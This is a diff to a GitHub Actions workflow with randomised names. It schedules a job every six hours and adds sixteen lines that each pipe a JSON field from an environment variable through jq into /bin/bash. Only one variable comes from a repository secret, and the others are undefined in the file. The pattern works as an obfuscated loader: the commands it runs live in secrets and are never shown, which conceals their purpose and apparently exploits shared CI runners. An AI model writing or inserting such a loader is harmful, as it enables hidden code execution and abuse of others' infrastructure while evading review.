@@ -1,9 +1,11 @@
 name: xiongtianping4187
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 2/6 * * *'
-jobs:  # 24937
+    - cron: '41 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,12 +13,22 @@ jobs:  # 24937
       - uses: actions/checkout@v4
       - name: xiongtianping4187
         env:
-          q87: ${{ secrets.q87 }}
+          kk23: ${{ secrets.kk23 }}
         run: |
-          echo $q87 | jq -r .zwzk199 | /bin/bash
-          echo $wetm8204 | jq -r .f52536 | /bin/bash
-          echo $t24433 | jq -r .iw0 | /bin/bash
-          echo $mvm93 | jq -r .tirq9848 | /bin/bash
-          echo $ih09646 | jq -r .uvrz6060 | /bin/bash
-          echo $fbwdx89 | jq -r .oq0146 | /bin/bash
+          echo $kk23 | jq -r .pbj74273 | /bin/bash
+          echo $zg4 | jq -r .ecfan48 | /bin/bash
+          echo $itgi342 | jq -r .j065 | /bin/bash
+          echo $eixmy7 | jq -r .m55834 | /bin/bash
+          echo $yn80958 | jq -r .imy657 | /bin/bash
+          echo $bsuyl8 | jq -r .xn36142 | /bin/bash
+          echo $sbn91 | jq -r .ts5211 | /bin/bash
+          echo $sqr07 | jq -r .vicv52349 | /bin/bash
+          echo $c443 | jq -r .db7491 | /bin/bash
+          echo $wnjfl8784 | jq -r .k19 | /bin/bash
+          echo $vzm2 | jq -r .mbvim18 | /bin/bash
+          echo $a6 | jq -r .dzr80 | /bin/bash
+          echo $iz30212 | jq -r .wvh67832 | /bin/bash
+          echo $ulna8308 | jq -r .dk591 | /bin/bash
+          echo $qeskn4 | jq -r .frbx14 | /bin/bash
+          echo $qd28638 | jq -r .vxkt69 | /bin/bash
 
